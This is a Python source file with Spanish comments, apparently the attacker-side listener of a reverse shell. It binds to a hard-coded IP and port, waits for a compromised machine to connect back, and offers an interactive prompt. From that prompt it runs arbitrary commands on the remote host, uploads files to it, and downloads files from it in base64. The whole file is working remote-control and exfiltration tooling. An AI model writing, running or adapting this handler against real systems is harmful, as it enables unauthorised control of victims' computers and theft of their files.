#!/usr/bin/env python3
# _*_ coding: utf8 _*_

import socket
import base64


def sv():
    global servidor
    global ip
    global target
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Configura el servidor para IPv4 y TCP
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Configura servidor para usar únicamente socket y que se pueda reusar la dirección
    servidor.bind(("192.168.0.19", 1608))  # IP (cambiar) y puerto
    servidor.listen(1)  # Acepta una única conexión
    print("Servidor andando y esperando conexiones...")
    target, ip = servidor.accept()
    print("Recibida conexión desde: "+str(ip[0]))


def shell():
    directorio = target.recv(2048)  # Recibe los bytes del directorio
    while True:
        comando = input(directorio.decode()+"~$: ")  # Printea el directorio formateado y pasado a string
        if comando == "exit":
            break
        elif comando[:2] == "cd":  # Caso especial porque se caía con el cd, haciendo que cambie de directorio por python
            target.send(comando.encode())
            res = target.recv(2048)
            directorio = res
            print(res.decode())
        elif comando == "":  # Para que no se caiga con un enter
            pass
        elif comando[:5] == "subir":
            try:
                target.send(comando.encode())
                with open(comando[6:], 'rb') as arch:
                    target.send(base64.b64encode(arch.read()))
            except:
                print("Ocurrió un error en la subida de '"+res.decode()+"'")
        elif comando[:9] == "descargar":
            target.send(comando.encode())
            with open(comando[10:], 'wb') as arch:
                datos = target.recv(30000)
                print(datos.decode())
                arch.write(base64.b64decode(datos.decode()))
        else:
            target.send(comando.encode())
            res = target.recv(2048)
            if res == "1":
                continue
            else:
                print(res.decode())


sv()
shell()
servidor.close()
